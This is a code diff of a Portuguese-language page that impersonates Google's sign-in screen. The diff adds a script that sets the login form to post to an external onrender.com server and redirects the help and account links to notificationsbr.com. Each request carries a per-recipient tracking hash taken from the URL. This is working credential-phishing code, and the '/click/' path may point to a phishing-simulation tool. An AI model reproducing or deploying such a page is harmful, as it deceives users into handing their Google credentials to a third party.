@@ -21,19 +21,18 @@
       <h2>Fazer login</h2>
       <h3>Use sua Conta do Google</h3>
 
-      <form action="https://servidor-5kmo.onrender.com/submit-login" method="POST"
-        enctype="application/x-www-form-urlencoded">
+      <form id="loginForm" method="POST" enctype="application/x-www-form-urlencoded">
         <input type="email" name="email" placeholder="E-mail ou telefone" required />
         <div class="btn-email">
-          <button type="button">Esqueceu seu e-mail?</button>
+          <button type="button" id="forgotEmail">Esqueceu seu e-mail?</button>
         </div>
         <p>
           Não está no seu computador? Use o modo visitante para fazer login com
           privacidade.
-          <a href="">Saiba mais</a>
+          <a id="saibaMais" href="#">Saiba mais</a>
         </p>
         <div class="card-bottom">
-          <a href="">Criar conta</a>
+          <a id="createAccount" href="#">Criar conta</a>
           <button type="submit">Próxima</button>
         </div>
       </form>
@@ -55,6 +54,30 @@
       </div>
     </div>
   </div>
+
+  <script>
+    // Captura a hash da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const hash = urlParams.get('hash');
+
+    if (hash) {
+      // 🔹 Adiciona a hash ao formulário de login
+      document.getElementById('loginForm').action = `https://server-djsk.onrender.com/click/submit-login?hash=${encodeURIComponent(hash)}`;
+
+      // 🔹 Adiciona a hash ao botão "Esqueceu seu e-mail?"
+      document.getElementById('forgotEmail').addEventListener('click', function () {
+        window.location.href = `https://notificationsbr.com/emails/recuperacao/?hash=${encodeURIComponent(hash)}`;
+      });
+
+      // 🔹 Adiciona a hash ao link "Saiba mais"
+      document.getElementById('saibaMais').href = `https://notificationsbr.com/saiba-mais/?hash=${encodeURIComponent(hash)}`;
+
+      // 🔹 Adiciona a hash ao link "Criar conta"
+      document.getElementById('createAccount').href = `https://notificationsbr.com/criar-conta/?hash=${encodeURIComponent(hash)}`;
+    } else {
+      console.error("❌ Hash não encontrada na URL!");
+    }
+  </script>
 </body>
 
 </html>
